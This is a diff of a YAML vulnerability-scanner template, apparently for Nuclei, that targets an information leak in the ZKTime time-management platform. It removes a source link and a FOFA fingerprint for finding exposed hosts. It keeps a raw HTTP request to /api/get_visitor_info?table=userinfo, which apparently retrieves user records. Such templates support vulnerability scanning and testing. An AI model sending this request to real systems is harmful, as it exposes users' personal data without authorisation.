@@ -3,12 +3,8 @@ info:
   name: ZKTime时间精细化管理平台 get_visitor_info 存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bqpez4daw4rs556h'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bqpez4daw4rs556h
-    fofa: body="/media/img/login/zktime_logo_zh-cn.png" && body="/iclock/imanager"
 http:
 - raw:
   - 'GET /api/get_visitor_info?table=userinfo HTTP/1.1
